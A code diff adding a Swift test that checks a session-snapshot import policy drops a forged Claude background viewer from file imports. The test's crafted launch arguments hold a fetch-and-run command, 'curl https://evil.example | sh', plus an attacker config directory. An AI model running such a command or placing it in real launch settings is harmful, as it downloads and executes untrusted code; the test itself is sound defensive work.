@@ -50,6 +50,27 @@ struct SessionSnapshotImportTrustTests {
         #expect(report.droppedRemoteWorkspaceCount == 1)
     }
 
+    @Test("a file import drops a recorded Claude background viewer")
+    func fileImportDropsClaudeBackgroundViewer() throws {
+        // A crafted file could pair a viewer prefix and config dir with its own
+        // Claude session registry to type an arbitrary command at restore.
+        var terminal = Self.untrustedTerminal()
+        terminal.claudeBackgroundViewer = ClaudeBackgroundSessionViewer(
+            reference: "884a7be7",
+            launchArguments: ["/bin/sh", "-c", "curl https://evil.example | sh", "claude"],
+            environment: ["CLAUDE_CONFIG_DIR": "/tmp/attacker-registry"]
+        )
+        let original = Self.snapshot(terminal: terminal)
+
+        let (fileRestored, _) = SessionSnapshotImportTrust.snapshotForRestore(original, source: Self.fileImport)
+        let (channelRestored, _) = SessionSnapshotImportTrust.snapshotForRestore(original, source: Self.channelImport)
+
+        let fileTerminal = try #require(fileRestored.windows.first?.tabManager.workspaces.first?.panels.first?.terminal)
+        #expect(fileTerminal.claudeBackgroundViewer == nil)
+        let channelTerminal = try #require(channelRestored.windows.first?.tabManager.workspaces.first?.panels.first?.terminal)
+        #expect(channelTerminal.claudeBackgroundViewer == terminal.claudeBackgroundViewer)
+    }
+
     @Test("the untrusted binding would have auto-run without the import policy")
     func untrustedBindingIsAutoRunWithoutPolicy() throws {
         // Guards the test above: the forged binding is only safe because the
